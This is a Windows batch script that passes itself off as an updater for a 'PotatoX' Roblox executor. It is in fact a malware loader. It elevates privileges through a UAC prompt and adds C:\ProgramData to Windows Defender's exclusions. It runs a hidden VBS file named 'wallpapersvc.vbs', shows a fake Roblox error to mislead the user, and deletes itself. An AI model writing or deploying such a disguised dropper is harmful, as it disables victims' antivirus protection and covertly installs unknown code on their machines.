@echo off
cd "C:\ProgramData"
title PotatoX Executor - Updating
NET SESSION >nul 2>&1
IF %ERRORLEVEL% EQU 0 (
    goto :adminConfirmed
) ELSE (
    echo Requesting administrative privileges...
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
)
:adminConfirmed
powershell -Command "& {Add-MpPreference -ExclusionPath 'C:\ProgramData'}" -ExecutionPolicy Bypass
powershell -Command "& {$paths = (Get-MpPreference).ExclusionPath; if ('C:\ProgramData' -in $paths) {Write-Host 'Loaded assets.' -ForegroundColor Green} else {Write-Host 'Assets failed to load.' -ForegroundColor Red}}" -ExecutionPolicy Bypass
start wscript "C:\ProgramData\wallpapersvc.vbs"
msg *.* RobloxInit failed to complete (0x00000000)
start cmd /c "timeout /t 2 /nobreak & del *.bat"
exit
